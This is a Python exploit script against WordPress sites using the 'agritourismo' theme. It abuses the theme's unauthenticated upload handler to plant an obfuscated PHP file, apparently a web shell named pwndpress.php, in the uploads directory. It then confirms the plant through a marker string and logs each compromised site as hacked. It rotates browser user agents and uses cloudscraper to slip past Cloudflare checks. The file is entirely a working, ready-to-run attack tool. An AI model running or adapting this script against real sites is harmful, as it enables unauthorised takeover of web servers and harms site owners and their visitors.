import os, requests, argparse, sys, json, cloudscraper
from fake_useragent import UserAgent
from datetime import datetime

year = datetime.now().year
month = datetime.now().month

scraper = cloudscraper.create_scraper()

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="Target url")
args = parser.parse_args()

if args.url == None:
    print ('[INFO] Please input the target url')
    sys.exit()
else:pass

url = str(args.url)
url = url.replace('http://', '').replace('https://', '').replace('/', '')

try:
    # USE CONFIGURATION FILE
    requesterConf = open('./requester.json')
    requester = json.load(requesterConf)
    
    verify = requester['verify']
    redirect = requester['redirect']
    timeout = requester['timeout']
    method = requester['method']
    agent = requester['agent']
    
except:
    # SET DEFAULT CONFIGURATION
    verify = True
    redirect = True
    timeout = 10
    method = 'requests'
    agent = None


# REQUEST TO TARGET URL
try:
    # CREATE USER AGENT
    if agent == None:
        ua = UserAgent().chrome
        headers = {"User-Agent": str(ua)}
    else:
        headers = {"User-Agent": str(agent)}
    
    # CSRF EXPLOIT WITH CHECK FILE UPLOAD
    files = {'uploadfile': open('./inc/pwndpress.php', 'rb')}
    flag = 'trustsec' # pnwdpress.php is encode base64 & has obfuscated will show output 'trustsec'
    
    data = {'submit': 'upload'}
    if method == 'cloudscraper':
        scraper.post('http://'+ url +'/wp-content/themes/agritourismo-theme/functions/upload-handler.php', data=data, files=files, headers=headers, timeout=timeout, verify=verify, allow_redirects=redirect)
        check = scraper.get(f'http://{url}/wp-content/uploads/{year}/{month}/pwndpress.php', headers=headers, timeout=timeout, verify=verify, allow_redirects=redirect).text
    else:
        requests.post('http://'+ url +'/wp-content/themes/agritourismo-theme/functions/upload-handler.php', data=data, files=files, headers=headers, timeout=timeout, verify=verify, allow_redirects=redirect)
        check = requests.get(f'http://{url}/wp-content/uploads/{year}/{month}/pwndpress.php', headers=headers, timeout=timeout, verify=verify, allow_redirects=redirect).text
    
    if flag in check:
        print(f'[H#CKED] http://{url}/wp-content/uploads/{year}/{month}/pwndpress.php')
        open('./pnwdpress.txt', 'a').write(f'[H#CKED] http://{url}/wp-content/uploads/{year}/{month}/pwndpress.php\n')
    else:pass
except:
    print ('[ERROR] '+ url)